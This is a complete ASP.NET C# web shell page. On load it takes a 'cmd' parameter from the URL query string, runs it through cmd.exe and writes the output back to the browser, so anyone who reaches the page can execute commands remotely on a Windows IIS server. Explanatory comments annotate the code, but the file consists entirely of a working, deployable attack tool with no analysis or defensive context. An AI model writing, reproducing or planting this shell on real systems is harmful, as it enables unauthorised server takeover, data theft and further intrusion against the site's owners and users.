<%@ Page Language="C#" Debug="false" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    // Get the command from the URL query string (?cmd=whoami)
    string cmd = Request.QueryString["cmd"];

    // If command is not empty, execute it and return output
    if (!string.IsNullOrEmpty(cmd))
    {
        string output = ExecuteCmd(cmd);
        OutputResult(output);
    }
}

protected string ExecuteCmd(string arg)
{
    // Configure how the process (cmd.exe) will run
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";             // Use Windows command shell
    psi.Arguments = "/c " + arg;          // /c means "run the command then exit"
    psi.RedirectStandardOutput = true;    // Capture the command output
    psi.UseShellExecute = false;          // Needed to redirect output

    // Start the process and capture the output
    using (Process p = Process.Start(psi))
    using (StreamReader stmrdr = p.StandardOutput)
    {
        string result = stmrdr.ReadToEnd();
        return result;
    }
}

protected void OutputResult(string result)
{
    // Send the output back to the browser in a readable format
    Response.Write("<pre>");
    Response.Write(Server.HtmlEncode(result)); // Encode to prevent HTML injection
    Response.Write("</pre>");
}
</script>
